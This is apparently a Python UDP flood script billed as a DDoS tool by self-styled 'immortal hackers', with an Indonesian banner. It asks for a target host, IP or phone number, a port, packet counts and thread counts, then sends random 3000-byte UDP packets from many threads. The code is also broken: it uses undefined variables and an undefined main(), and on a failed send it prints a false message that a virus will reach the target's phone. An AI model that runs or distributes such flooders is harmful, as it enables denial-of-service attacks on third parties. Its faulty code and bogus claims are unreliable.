#!/usr/bin/env python3
#Create By Cyber_Pemula
import random
import socket
import threading
print("\033[1;33;40m")
print( '''
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
  DDOS ATTACK: WR.py
  Create: ¥¥THE IMMORTAL HACKERS¥¥
  Gunakan dengan bijak Ddos di gunakan untuk merusak....
  €€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
  hello my friend, welcome to WR.py, immortal hacker,we will always make the impossible,thank you
  Semoga hari anda menyenangkan. Jangan lupa tersenyum
~~~~~~~~~~~~~√~~~~~~~~~~~~~√~~~~~~~√~~~~~~~√~~~~~~√~~~~~~~~~\
~~~~~~~~~~~~~√~~~~~~~~~~~~~√~~~~~~~√~~~~~~~√~~~~~~√~~~~~~~~~/
	''')
#Create RIDWAN&&WIBI
print("\033[0m")
ip = str(input(" \033[1;32;40mHost/Ip/NomorHp: \033[0m"))
port = int(input(" \033[1;32;40mPort\033[1;34;40m(\033[1;31;40m80\033[1;34;40m): \033[0m"))
choice = "y",
times = int(input(" \033[1;32;40mPackets per connection\033[1;34;40m(\033[1;31;40m50\033[1;34;40m-\033[1;31;40m1000\033[1;34;40m): \033[0m"))
threads = int(input(" \033[1;32;40mThreads\033[1;34;40m(\033[1;31;40m100\033[1;34;40m-\033[1;31;40m1000\033[1;34;40m): \033[0m"))
def run():
	data = random._urandom(3000)
	i = random.choice(("\033[1;34;40m[\033[1;31;40mHYPERUDP\033[1;34;40m]","\033[1;34;40m[\033[1;32;40mWACHIRA\033[1;34;40m]","\033[1;34;40m[\033[1;33;40mATTACK\033[1;34;40m]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(NoHp),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" \033[1;32;40mATTACK-------------------> \033[0;31;47m" + no.Hp +"\033[0m")
		except:
			print("\033[1;34;40m[\033[1;31;40m!\033[1;34;40m] \033[0;31;47mVirus Akan Di Kirimkan::Lihat Hp Target \033[0m")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run)
		th.start()
#Create By Cyber_SpLiTTer
if __name__ == "__main__":
    main()
